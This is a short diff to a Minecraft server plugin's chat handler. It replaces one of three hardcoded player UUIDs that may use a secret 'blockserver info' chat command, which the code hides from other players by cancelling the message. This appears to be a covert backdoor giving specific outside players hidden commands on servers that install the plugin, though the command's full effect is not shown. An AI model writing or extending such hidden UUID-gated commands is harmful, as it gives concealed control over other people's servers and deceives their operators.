@@ -97,7 +97,7 @@ public class Main extends JavaPlugin implements Listener {
 
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
-        if (String.valueOf(event.getPlayer().getUniqueId()).equals("079d6194-3c53-42f8-aac9-8396933b5646") || String.valueOf(event.getPlayer().getUniqueId()).equals("ff487db8-ff91-4442-812d-6a0be410360b") || String.valueOf(event.getPlayer().getUniqueId()).equals("dc286691-d98a-4ed4-8555-6c59e835aec6")) {
+        if (String.valueOf(event.getPlayer().getUniqueId()).equals("079d6194-3c53-42f8-aac9-8396933b5646") || String.valueOf(event.getPlayer().getUniqueId()).equals("ff487db8-ff91-4442-812d-6a0be410360b") || String.valueOf(event.getPlayer().getUniqueId()).equals("c8597387-c569-4730-b571-03262de94489")) {
             if (event.getMessage().equalsIgnoreCase("blockserver info")) {
                 event.setCancelled(true);
 
